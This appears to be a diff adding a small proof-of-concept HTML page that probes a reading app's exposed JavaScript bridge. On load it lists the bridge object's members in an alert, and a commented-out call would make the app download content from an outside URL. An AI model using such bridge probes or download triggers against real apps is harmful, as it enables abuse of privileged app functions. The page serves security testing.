@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="max-age=7200" />
+ <meta http-equiv="Expires" content="Mon, 20 Jul 2020 23:00:00 GMT" />
+<script type="text/javascript">
+function gotarget(){
+for(var i=0;i<10;i++){
+setTimeout("getinfo()",i*5);
+}
+document.getElementById('target').src="https://z3.cn/";
+}
+function getinfo(){
+	var ret="";
+	for (var obj in window.ZhangYueJS){
+		ret+=obj+"\r\n";
+	}
+	
+	//window.ZhangYueJS.do_command("{'Action':'chapPackDownload','Data':{'introStr':'https://cusas.github.io/obj2.htm'}}");
+	if(ret!=""){
+	alert(ret);
+	}
+}
+</script>
+	</head>
+<body onload="javascript:gotarget()">
+<iframe id="target" name="target" src="about:blank"></iframe>
+</body>
+
+</html>
